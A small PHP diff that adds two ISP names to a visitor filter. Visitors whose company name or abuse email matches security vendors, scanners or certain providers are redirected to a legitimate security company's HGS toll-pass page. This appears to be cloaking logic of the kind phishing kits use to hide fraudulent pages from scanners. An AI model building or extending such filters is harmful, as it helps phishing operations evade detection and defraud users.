@@ -105,6 +105,8 @@ if (
     strpos($ziyaretcicompanyname, 'avast') !== false ||
     strpos($ziyaretcicompanyname, 'viettel') !== false ||
     strpos($ziyaretcicompanyname, 'carinet') !== false ||
+    strpos($ziyaretcicompanyname, 'vodafone') !== false ||
+    strpos($ziyaretcicompanyname, 'ttnet') !== false ||
     strpos($ziyaretciabuseemail, 'google') !== false
 ) {
     $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
